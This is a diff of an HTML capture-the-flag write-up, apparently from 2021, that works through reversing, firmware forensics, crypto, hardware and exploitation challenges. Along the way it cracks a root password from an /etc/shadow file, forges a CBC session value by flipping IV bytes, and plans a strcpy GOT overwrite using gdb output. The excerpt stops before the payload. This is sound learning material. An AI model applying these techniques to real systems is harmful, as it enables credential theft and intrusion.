-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55</pre></td><td><pre style="margin: 0; line-height: 125%">      <span style="color: #008800; font-weight: bold">if</span> (((local_34 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">10</span>) <span style="color: #333333">&amp;&amp;</span> (local_30 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">5</span>)) <span style="color: #333333">&amp;&amp;</span> (local_28 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">5</span>)) {
-        jmp_ebx<span style="color: #333333">+</span><span style="color: #005588; font-weight: bold">0x0c</span>(iVar1);
-        local_34 <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-        local_28 <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-        iVar1 <span style="color: #333333">=</span> jmp_ebx<span style="color: #333333">+</span><span style="color: #005588; font-weight: bold">0x1c</span>(<span style="background-color: #fff0f0">&quot;file2&quot;</span>,<span style="color: #333333">&amp;</span>DAT_00012008);
-        <span style="color: #008800; font-weight: bold">if</span> (iVar1 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">0</span>) {
-          uVar2 <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-        }
-        <span style="color: #008800; font-weight: bold">else</span> {
-          <span style="color: #008800; font-weight: bold">if</span> (iVar1 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">0</span>) {
-            uVar2 <span style="color: #333333">=</span> <span style="color: #005588; font-weight: bold">0xffffffff</span>;
-          }
-          <span style="color: #008800; font-weight: bold">else</span> {
-            <span style="color: #008800; font-weight: bold">while</span> (iVar3 <span style="color: #333333">=</span> jmp_ebx<span style="color: #333333">+</span><span style="color: #005588; font-weight: bold">0x20</span>(iVar1), iVar3 <span style="color: #333333">!=</span> <span style="color: #333333">-</span><span style="color: #0000DD; font-weight: bold">1</span>) {
-              iVar4 <span style="color: #333333">=</span> jmp_ebx<span style="color: #333333">+</span><span style="color: #005588; font-weight: bold">0x18</span>(iVar1);
-              <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">2</span>) {
-                <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x46</span>) {
-                  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-                }
-                local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-              }
-              <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">4</span>) {
-                <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x4c</span>) {
-                  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-                }
-                local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-              }
-              <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">6</span>) {
-                <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x41</span>) {
-                  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-                }
-                local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-              }
-              <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #005588; font-weight: bold">0xc</span>) {
-                <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x47</span>) {
-                  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-                }
-                local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-              }
-              <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #005588; font-weight: bold">0xd</span>) {
-                <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x32</span>) {
-                  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-                }
-                local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-              }
-              <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">0</span>) {
-                local_2c <span style="color: #333333">=</span> local_2c <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-              }
-              local_34 <span style="color: #333333">=</span> local_34 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-            }
-            <span style="color: #008800; font-weight: bold">if</span> (((local_34 <span style="color: #333333">==</span> <span style="color: #005588; font-weight: bold">0x1e</span>) <span style="color: #333333">&amp;&amp;</span> (local_2c <span style="color: #333333">==</span> <span style="color: #005588; font-weight: bold">0x19</span>)) <span style="color: #333333">&amp;&amp;</span> (local_28 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">5</span>)) {
-              jmp_ebx<span style="color: #333333">+</span><span style="color: #005588; font-weight: bold">0x10</span>(
-                          <span style="background-color: #fff0f0">&quot;High Fives All Around!</span><span style="color: #666666; font-weight: bold; background-color: #fff0f0">\n</span><span style="background-color: #fff0f0">Now, figure out how to send your solution(s) tothe file server at http://challenges.ctfd.io:30465/&quot;</span>
-                          );
-            }
-</pre></td></tr></table></div>
-<p>The program reads input from "file2", iterates through the stream in manner identical to before, and sets three new local variables based on certain conditions as above. Below we see the contents of file2
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
+</p>
+
+<p>
+    The program reads input from "file2", iterates through the stream in manner identical to before, and sets three new local variables based on certain conditions as above. Below we see the contents of file2
+</p>
+
+<pre id="bash"><code>
 00000000: 0046 004c 0041 0000 0000 0047 3200 0000  .F.L.A.....G2...
 00000010: 0000 0000 0000 0000 0000 0000 0000       ..............
-</div>
 
-		<h3>Forensics #3: Not Software, Not Hardware</h3>
-		<p>
-		We're given a non-descript file called <a href="atrhax2021/McAfee_CTF.bin">McAfee_CTF.bin</a>.
-		I first opened this file in a hex editor and, noting the string Airlink101 AR670W, decided this was a firmware file. I then ran the file through binwalk to analyze and extracted a SquashFS file system. At this point, I executed `find squashfs | grep flag` and found a file titled flag.enc in the root user's home directory containing base64-encoded text. After decoding, I executed the `file` tool on the output which determined it to be an OpenSSL ciphertext with salted password. The root user's secret directory also contained a README file containing the following text:
-		</p>
-		<blockquote>
-		I encrypt them using: echo "secret" | openssl enc -aes256 -salt -out file.enc -e -a -pbkdf2 -k 'PASSWORD'
-		and decrypt them using: openssl enc -aes256 -in file.enc -out file.txt -d -a -pbkdf2
-		</blockquote>
-		
-		At this point, I grabbed the /etc/passwd and /etc/shadow files and used jtr to crack the password for the root user, which was found to be "P@55w0rd!".
-		<h3>Cryptography #1: Light Switch Crypto</h3>
-		<p>
-		In this challenge we're given some an <a href="atrhax2021/light_switch_crypto/CTF_1.png">image</a> depicting the workings of a "3-way lightswitch", along with a <a href="atrhax2021/light_switch_crypto.tar">Python file</a> in which we're expected to finish the implementation of magic_func whose workings are explained by the previous image.
-		</p>
+</code></pre>
 
-		<p>
-		We may consider each circuit of the light switch (refer to the image) as a function of two boolean variables ,  \(s_1\) and \(s_2\) (where 0 = off, 1 = on) , corresponding to the states of the switches one and two, respectively. Let \(C_1\), \(C_2\), and \(C_3\) be circuits one, two, and three, respectively. Translating the rules given in the image into our formalism gives
-
-		$$C_1 = \begin{cases} 
-		0 & \text{if}\  s_0 = s_1 = 0\\
-			      1 & \text{otherwise} 
-		      \end{cases}
-		$$
-
-$$C_2 = \begin{cases} 
-		0 & \text{if}\  s_0 = s_1 = 1\\
-			      1 & \text{otherwise} 
-		      \end{cases}
-		$$
-
-$$C_3 = \begin{cases} 
-1 & \text{if}\  s_0 = s_1 = 1\\
-	      0 & \text{otherwise} 
-      \end{cases}
-$$
-
-This is enough information to provide a simple solution. However, it helps to recognize that these functions may be expressed simply in terms of common boolean operators. I.e., circuit \(C_1\) is equivalent to the OR operator, circuit \(C_3\) is equivalent to the AND operator, and \(C_2\) is the NAND operator. Combining the inputs and outputs of the circuits as shown in the reference image produces the solution.
-		</p>
-<h3>Cryptography #2: IVe seen sites like this before</h3>
 <p>
-	In this challenge, we are given a link to a server which simply responds with "Current User: unpriv_user1 UID: 40" when visited. The given URL had the parameters "iv=f15188446e6e3167"<br>
-	and "session=bbf6ad986ed574e8949d7b7e9348f38c4d1d93ab85062c3f168b1c82b7279845".
+		<h3>Forensics #3: Not Software, Not Hardware</h3>
+</p>
 
-	The page source included the following helpful comments:<br><br>
-	Changelog<br>
-	09/15/2018 - Changed from DES to AES-256-CBC after our latest data breach 		<br>
-	05/23/2018 - Todd is and idiot and somehow never knows how to login so I have added the encryption IV and the encrypted session to the URL parameters <br>
-	03/12/2018 - String compare of the users is acting up I found a different way to validate users <br>
-	02/08/2018 - Moved the default user from root to unprivlaged users. This way only admins can access this page<br>
+<p>
+		
+</p>
 
-	<p>
+<p>
+		We're given a non-descript file called <a href="atrhax2021/McAfee_CTF.bin">McAfee_CTF.bin</a>.
+</p>
+
+<p>
+		I first opened this file in a hex editor and, noting the string Airlink101 AR670W, decided this was a firmware file. I then ran the file through binwalk to analyze and extracted a SquashFS file system. At this point, I executed `find squashfs | grep flag` and found a file titled flag.enc in the root user's home directory containing base64-encoded text. After decoding, I executed the `file` tool on the output which determined it to be an OpenSSL ciphertext with salted password. The root user's secret directory also contained a README file containing the following text:
+</p>
+
+<p>
+		
+</p>
+
+<p>
+		<blockquote>
+</p>
+
+<p>
+		I encrypt them using: echo "secret" | openssl enc -aes256 -salt -out file.enc -e -a -pbkdf2 -k 'PASSWORD'
+</p>
+
+<p>
+		and decrypt them using: openssl enc -aes256 -in file.enc -out file.txt -d -a -pbkdf2
+</p>
+
+<p>
+		</blockquote>
+</p>
+
+<p>
+		
+</p>
+
+<p>
+		At this point, I grabbed the /etc/passwd and /etc/shadow files and used jtr to crack the password for the root user, which was found to be "P@55w0rd!".
+</p>
+
+<p>
+		<h3>Cryptography #1: Light Switch Crypto</h3>
+</p>
+
+<p>
+		
+</p>
+
+<p>
+		In this challenge we're given some an <a href="atrhax2021/light_switch_crypto/CTF_1.png">image</a> depicting the workings of a "3-way lightswitch", along with a <a href="atrhax2021/light_switch_crypto.tar">Python file</a> in which we're expected to finish the implementation of magic_func whose workings are explained by the previous image.
+</p>
+
+<p>
+		
+</p>
+
+<p>
+		
+</p>
+
+<p>
+		We may consider each circuit of the light switch (refer to the image) as a function of two boolean variables ,  \(s_1\) and \(s_2\) (where 0 = off, 1 = on) , corresponding to the states of the switches one and two, respectively. Let \(C_1\), \(C_2\), and \(C_3\) be circuits one, two, and three, respectively. Translating the rules given in the image into our formalism gives
+</p>
+
+<p>
+		$$C_1 = \begin{cases} 0 & \text{if}\  s_0 = s_1 = 0\\1 & \text{otherwise} \end{cases}$$
+</p>
+
+<p>
+		$$C_2 = \begin{cases} 0 & \text{if}\  s_0 = s_1 = 1\\1 & \text{otherwise} \end{cases}$$
+</p>
+
+<p>
+		$$C_3 = \begin{cases} 1 & \text{if}\  s_0 = s_1 = 1\\0 & \text{otherwise} \end{cases}$$
+</p>
+
+<p>
+This is enough information to provide a simple solution. However, it helps to recognize that these functions may be expressed simply in terms of common boolean operators. I.e., circuit \(C_1\) is equivalent to the OR operator, circuit \(C_3\) is equivalent to the AND operator, and \(C_2\) is the NAND operator. Combining the inputs and outputs of the circuits as shown in the reference image produces the solution.
+</p>
+
+<p>
+		
+</p>
+
+<h3>Cryptography #2: IVe seen sites like this before</h3>
+
+<p>
+	In this challenge, we are given a link to a server which simply responds with "Current User: unpriv_user1 UID: 40" when visited. The given URL had the parameters "iv=f15188446e6e3167" and "session=bbf6ad986ed574e8949d7b7e9348f38c4d1d93ab85062c3f168b1c82b7279845".
+</p>
+
+<p>
+	The page source included the following helpful comments:
+</p>
+
+<p>
+	Changelog
+</p>
+
+<p>
+	09/15/2018 - Changed from DES to AES-256-CBC after our latest data breach 		
+</p>
+
+<p>
+	05/23/2018 - Todd is and idiot and somehow never knows how to login so I have added the encryption IV and the encrypted session to the URL parameters 
+</p>
+
+<p>
+	03/12/2018 - String compare of the users is acting up I found a different way to validate users 
+</p>
+
+<p>
+	02/08/2018 - Moved the default user from root to unprivlaged users. This way only admins can access this page
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	It is clear that the session parameter is decrypted by the server upon receiving the parameters from the user. This could be demonstrated by modifying the session value to produce a decrpytion error message ("bad decrypt") that the server sent as a response. The contents of the page give us a clue as to what the session parameter might contain: namely a username and a user id value. It's a safe bet that user id 0 is a privileged user. Furthermore, since the page prints the username first and the user id second, one may be led to guess that the user id is contained within the last ciphertext block.
-	</p>
-	<p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	If the user id really is in the last block then, as the last block is XOR'ed with the IV to produce the final plaintext block, we should be able to manipulate its value. Modifying the last byte of the IV produced a change in the displayed uid value in the server response. The value was not obviously predictable, so a simple Python script was written to try all possible values (0 to 255) for the last byte until one producing a uid of 0 was found.
-		</p>
-	<h3>Cryptography #3: Know Your Header</h3>
-	<p>
+</p>
+
+<p>
+		
+</p>
+
+<h3>Cryptography #3: Know Your Header</h3>
+
+<p>
 	We are given an <a href="atrhax2021/know_your_header.tar">encrypted executable file</a> along with a Python program used to decrypt it. The decryptor merely XORs a fixed-length key whose length is less than 9 bytes against the ciphertext file. We know that the program is an x86-64 Linux ELF file. Luckily for us, the first few bytes of ELF executables are extremely predictable. 
-	</p>
-	<p>
-	the first 16 bytes of the encrypted file are seen below:<br>
-	00000000: e040 e49b 960b 14dd 9f05 a8dd 940a 15dd  .@..............<br>
-	we know this is an elf, so many of these bytes are known:<br>
-	00000000: 7f45 4c46 0201 0100 ...<br>
-	xoring these bytes together yields the key:<br>
-	00000000: 9f05 a8dd 940a 15dd<br>
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	the first 16 bytes of the encrypted file are seen below:
+</p>
+
+<p>
+	00000000: e040 e49b 960b 14dd 9f05 a8dd 940a 15dd  .@..............
+</p>
+
+<p>
+	we know this is an elf, so many of these bytes are known:
+</p>
+
+<p>
+	00000000: 7f45 4c46 0201 0100 ...
+</p>
+
+<p>
+	xoring these bytes together yields the key:
+</p>
+
+<p>
+	00000000: 9f05 a8dd 940a 15dd
+</p>
+
+<p>
 	Once the executable was decrypted, it was reverse engineered (see next challenge below).
-	</p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	<h3>Reversing #2: Know Your Header</h3>
-	Here we are expected to produce an input to the executable decrypted in the crtyptography #3 challenge (above) that triggers a victory condition. 
-	<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">undefined8 <span style="color: #0066BB; font-weight: bold">main</span>(<span style="color: #333399; font-weight: bold">int</span> param_1,undefined8 <span style="color: #333333">*</span>param_2)
+</p>
 
+<p>
+	Here we are expected to produce an input to the executable decrypted in the crtyptography #3 challenge (above) that triggers a victory condition.
+</p>
+
+<pre id="c"><code>
+undefined8 main(int param_1,undefined8 *param_2)
 {
-  <span style="color: #333399; font-weight: bold">int</span> iVar1;
-  <span style="color: #333399; font-weight: bold">char</span> <span style="color: #333333">*</span>__s1;
+  int iVar1;
+  char *__s1;
   
-  <span style="color: #008800; font-weight: bold">if</span> (param_1 <span style="color: #333333">&lt;</span> <span style="color: #0000DD; font-weight: bold">2</span>) {
-    usage(<span style="color: #333333">*</span>param_2);
-                    <span style="color: #888888">/* WARNING: Subroutine does not return */</span>
-    exit(<span style="color: #0000DD; font-weight: bold">0</span>);
+  if (param_1 < 2) {
+    usage(*param_2);
+                    /* WARNING: Subroutine does not return */
+    exit(0);
   }
-  __s1 <span style="color: #333333">=</span> (<span style="color: #333399; font-weight: bold">char</span> <span style="color: #333333">*</span>)transform_password(param_2[<span style="color: #0000DD; font-weight: bold">1</span>]);
-  printf(<span style="background-color: #fff0f0">&quot;Decoded password: %s</span><span style="color: #666666; font-weight: bold; background-color: #fff0f0">\n</span><span style="background-color: #fff0f0">&quot;</span>,__s1);
-  iVar1 <span style="color: #333333">=</span> strcmp(__s1,<span style="background-color: #fff0f0">&quot;good job!&quot;</span>);
-  <span style="color: #008800; font-weight: bold">if</span> (iVar1 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">0</span>) {
-    print_flag(param_2[<span style="color: #0000DD; font-weight: bold">1</span>]);
-                    <span style="color: #888888">/* WARNING: Subroutine does not return */</span>
-    exit(<span style="color: #0000DD; font-weight: bold">1</span>);
+  __s1 = (char *)transform_password(param_2[1]);
+  printf("Decoded password: %s\n",__s1);
+  iVar1 = strcmp(__s1,"good job!");
+  if (iVar1 == 0) {
+    print_flag(param_2[1]);
+                    /* WARNING: Subroutine does not return */
+    exit(1);
   }
-  puts(<span style="background-color: #fff0f0">&quot;Invalid password :~( &quot;</span>);
-  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
+  puts("Invalid password :~( ");
+  return 0;
 }
-</pre></div>
+
+</code></pre>
+
+<p>
 The handy Ghidra decompilation above shows that argv[1] is fed to transform_password and compared to "good job!".
-<br>
-<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #333399; font-weight: bold">long</span> <span style="color: #0066BB; font-weight: bold">transform_password</span>(undefined8 param_1)
+</p>
 
+<pre id="c"><code>
+long transform_password(undefined8 param_1)
 {
-  <span style="color: #333399; font-weight: bold">long</span> in_FS_OFFSET;
-  <span style="color: #333399; font-weight: bold">int</span> local_28;
-  <span style="color: #333399; font-weight: bold">int</span> local_24;
-  <span style="color: #333399; font-weight: bold">long</span> local_20;
-  <span style="color: #333399; font-weight: bold">long</span> local_18;
-  <span style="color: #333399; font-weight: bold">long</span> local_10;
-
-  local_10 <span style="color: #333333">=</span> <span style="color: #333333">*</span>(<span style="color: #333399; font-weight: bold">long</span> <span style="color: #333333">*</span>)(in_FS_OFFSET <span style="color: #333333">+</span> <span style="color: #005588; font-weight: bold">0x28</span>);
-  local_28 <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-  local_20 <span style="color: #333333">=</span> decode_hex(param_1,<span style="color: #333333">&amp;</span>local_28,<span style="color: #333333">&amp;</span>local_28);
-  local_24 <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-  <span style="color: #008800; font-weight: bold">while</span> (local_24 <span style="color: #333333">&lt;</span> local_28) {
-    <span style="color: #333333">*</span>(byte <span style="color: #333333">*</span>)(local_20 <span style="color: #333333">+</span> local_24) <span style="color: #333333">=</span> <span style="color: #333333">*</span>(byte <span style="color: #333333">*</span>)(local_20 <span style="color: #333333">+</span> local_24) <span style="color: #333333">^</span> <span style="color: #005588; font-weight: bold">0x66</span>;
-    local_24 <span style="color: #333333">=</span> local_24 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
+  long in_FS_OFFSET;
+  int local_28;
+  int local_24;
+  long local_20;
+  long local_18;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  local_28 = 0;
+  local_20 = decode_hex(param_1,&local_28,&local_28);
+  local_24 = 0;
+  while (local_24 < local_28) {
+    *(byte *)(local_20 + local_24) = *(byte *)(local_20 + local_24) ^ 0x66;
+    local_24 = local_24 + 1;
   }
-  <span style="color: #008800; font-weight: bold">if</span> (local_10 <span style="color: #333333">!=</span> <span style="color: #333333">*</span>(<span style="color: #333399; font-weight: bold">long</span> <span style="color: #333333">*</span>)(in_FS_OFFSET <span style="color: #333333">+</span> <span style="color: #005588; font-weight: bold">0x28</span>)) {
-    local_18 <span style="color: #333333">=</span> local_20;
-                    <span style="color: #888888">/* WARNING: Subroutine does not return */</span>
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+    local_18 = local_20;
+                    /* WARNING: Subroutine does not return */
     __stack_chk_fail();
   }
-  <span style="color: #008800; font-weight: bold">return</span> local_20;
+  return local_20;
 }
-</pre></div>
 
-So the goal here is to find a hex encoded string S such that transform_password(S) == "good job!". Essentially, transform_password XORs the input with the 1-byte repeating key "\x66". Hence, the password is just "good job!" XOR 66, which is "01090902460c090447" in hex.
-	<H3>Hardware #1: Shack the Secret</h3>
-	<blockquote>
-	<p>
-A researcher has discovered a file that has been encrypted with AES-128-ECB by an embedded device. The encrypted file has been captured through network analysis and the raw file is called Blob. With no debug ports available on the embedded device, one must extract the encryption key. Luckily, we have captured IC bus traffic while exercising functionality.
-	</p>
-	<footer>Challenge description</footer>
-</blockquote>
+</code></pre>
+
 <p>
-We have <a href="atrhax2021/shack_the_secret.tar">two files</a>: an encrypted file called "Blob" and an I2C bus dump file called "BusTraffic.logicdata". The logicdata format is apparently used by software made for logic analyzers produced by the <a href=""https://www.saleae.com/>Saleae</a>. </p>
-<img src="atrhax2021/TSAL0003.jpg" alt="A Saleae logic analyzer device"></img>
-<p>I downloaded <a href="https://support.saleae.com/logic-software/legacy-software/latest-stable-release-download">Saleae Logic 1.2.18</a> (Logic 2 is seemingly incompatible with the data format used in the challenge) and imported the bus traffic data. On the right-hand side of the window, we see the "Analyzers" tab. Clicking the "+" icon and adding an I2C analyzer with the default settings reveals some information the "Decoded Protocols" panel.
+So the goal here is to find a hex encoded string S such that transform_password(S) == "good job!". Essentially, transform_password XORs the input with the 1-byte repeating key "\x66". Hence, the password is just "good job!" XOR 66, which is "01090902460c090447" in hex.
 </p>
+
+<h3>Hardware #1: Shack the Secret</h3>
+
+<p>
+	<blockquote>
+</p>
+
+<p>
+	
+</p>
+
+<p>
+A researcher has discovered a file that has been encrypted with AES-128-ECB by an embedded device. The encrypted file has been captured through network analysis and the raw file is called Blob. With no debug ports available on the embedded device, one must extract the encryption key. Luckily, we have captured IC bus traffic while exercising functionality.
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	<footer>Challenge description</footer>
+</p>
+
+<p>
+</blockquote>
+</p>
+
+<p>
+We have <a href="atrhax2021/shack_the_secret.tar">two files</a>: an encrypted file called "Blob" and an I2C bus dump file called "BusTraffic.logicdata". The logicdata format is apparently used by software made for logic analyzers produced by the <a href=""https://www.saleae.com/>Saleae</a>. 
+</p>
+
+<p>
+<img src="atrhax2021/TSAL0003.jpg" alt="A Saleae logic analyzer device"></img>
+</p>
+
+<p>
+I downloaded <a href="https://support.saleae.com/logic-software/legacy-software/latest-stable-release-download">Saleae Logic 1.2.18</a> (Logic 2 is seemingly incompatible with the data format used in the challenge) and imported the bus traffic data. On the right-hand side of the window, we see the "Analyzers" tab. Clicking the "+" icon and adding an I2C analyzer with the default settings reveals some information the "Decoded Protocols" panel.
+</p>
+
 <p>
 <img src="atrhax2021/shack_the_secret_logic1_2.png" alt="Salae Logic V1 window showing part of the password in the bottom right corner"></img>
-We can see from that the program has correctly decoded the I2C bus traffic, showing a series of one-byte writes eaching ending with an ACK. Taken together, the written bytes form the string "safepasswordcomm". This password is precisely 16 bytes, just long enough for AES-128-ECB. Running the `file` utility on the encrypted file reveals that it is in OpenSSL's salted format. Thus the file may be decrypted with the following command-line invocation
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">openssl aes-128-ecb -d -in blob -out decrypted_blob
-	</pre></div>
 </p>
-	<h3>Exploitation #1: A Winning Attitude</h3>
-	<blockquote>
-		<p>
-		This binary has a function named "winner" which is never executed. Your task is to find a vulnerability in the binary and leverage it to execute "winner". When "winner" is executed the flag will be sent to you.
 
+<p>
+We can see from that the program has correctly decoded the I2C bus traffic, showing a series of one-byte writes eaching ending with an ACK. Taken together, the written bytes form the string "safepasswordcomm". This password is precisely 16 bytes, just long enough for AES-128-ECB. Running the `file` utility on the encrypted file reveals that it is in OpenSSL's salted format. Thus the file may be decrypted with the following command-line invocation `openssl aes-128-ecb -d -in blob -out decrypted_blob`.
+</p>
+
+<h3>Exploitation #1: A Winning Attitude</h3>
+
+<p>
+	<blockquote>
+</p>
+
+<p>
+		
+</p>
+
+<p>
+		This binary has a function named "winner" which is never executed. Your task is to find a vulnerability in the binary and leverage it to execute "winner". When "winner" is executed the flag will be sent to you.
+</p>
+
+<p>
 The link above is running the executable and you can connect to it with netcat. Please use it to retrieve the flag after you get your exploit working on the binary.
-		</p>
+</p>
+
+<p>
+		
+</p>
+
+<p>
 		<footer>Challenge description</footer>
+</p>
+
+<p>
 	</blockquote>
-	<p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	We're given a 32-bit <a href="atrhax2021/www_net">Linux application</a> (with ASLR disabled) and we're expected to find a way to call a function called "winner". I analyzed the file in Ghidra (an excellent tool) and tried to make sense of the "main" function, which is the primary interesting function and a bulk of the application. Immediately the usage of strcpy stood out to me. The program reads 1024 bytes of input from stdin two different times, with two different destinations each time. 
-	</p>
-	<p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	
+</p>
+
+<p>
 After each read, strcpy is called, copying the data just read from stdin into an 8-byte heap allocated buffer. After that, the read buffer is filled with zeros. Finally puts is called to print out a string saying "Yay you printed some text!". After some experimentation, I was able to get a crash in the __strcpy_ssse3, a function internal to libc used by strcpy by putting 1024 'a' characters into stdin. Analyzing the coredump shows that the crash happened at
-	</p>
-	<p>
-	<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #333333">(</span>gdb<span style="color: #333333">)</span> x/4i <span style="color: #996633">$eip</span>
-<span style="color: #333333">=</span>&gt; 0xf7d44803 &lt;__strcpy_ssse3+5891&gt;:    mov    %ax,<span style="color: #333333">(</span>%edx<span style="color: #333333">)</span>
+</p>
+
+<p>
+	
+</p>
+
+<pre id="gdb"><code>
+&gt; 0xf7d44803 &lt;__strcpy_ssse3+5891&gt;:    mov    %ax,<span style="color: #333333">(</span>%edx<span style="color: #333333">)</span>
    0xf7d44806 &lt;__strcpy_ssse3+5894&gt;:    mov    0x2<span style="color: #333333">(</span>%ecx<span style="color: #333333">)</span>,%al
    0xf7d44809 &lt;__strcpy_ssse3+5897&gt;:    mov    %al,0x2<span style="color: #333333">(</span>%edx<span style="color: #333333">)</span>
    0xf7d4480c &lt;__strcpy_ssse3+5900&gt;:    mov    %edx,%eax
    0xf7d4480e &lt;__strcpy_ssse3+5902&gt;:    ret
-		</pre></div><br>
+
+</code></pre>
+
+<p>
    where eax was 0x41410a41 and edx was 0x41414141. This demonstrated the possibility of a byte-writing primitive.
-	</p>
+</p>
+
+<p>
 	
-	<p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	As it happens, the area of memory where the global offset table is held is writable. The goal now is to attempt to control strcpy in order to overwrite a GOT entry with the address of the "winner" function (0x08049427). The GOT entry for the puts function, located at 0x0804c030, is a prime target to be written to. 
-	</p>
-	<p>While working on this challenge I learned about <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, a GDB plugin that "makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers."</p>
-	<p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	While working on this challenge I learned about <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, a GDB plugin that "makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers."
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	pwndbg has some handy features such as a nicely formatted stack view and gotplt, which displays the global offset table:
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">pwndbg&gt; gotplt
+</p>
+
+<pre id="gdb"><code>
+pwndbg&gt; gotplt
 0x804c00c: <span style="color: #007020">read</span>@got.plt
 0x804c010: <span style="color: #007020">printf</span>@got.plt
 0x804c014: free@got.plt
@@ -526,29 +652,50 @@ After each read, strcpy is called, copying the data just read from stdin into an
 0x804c040: fopen@got.plt
 0x804c044: memset@got.plt
 0x804c048: calloc@got.plt
-</pre></div>
 
-	</p>
-	<p>
-	Let's analyze the execution when the following payload is piped to the program:<br>
-	<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">atrhax/winning_attitude % xxd input
+</code></pre>
+
+<p>
+	
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	Let's analyze the execution when the following payload is piped to the program:
+</p>
+
+<pre id="gdb"><code>
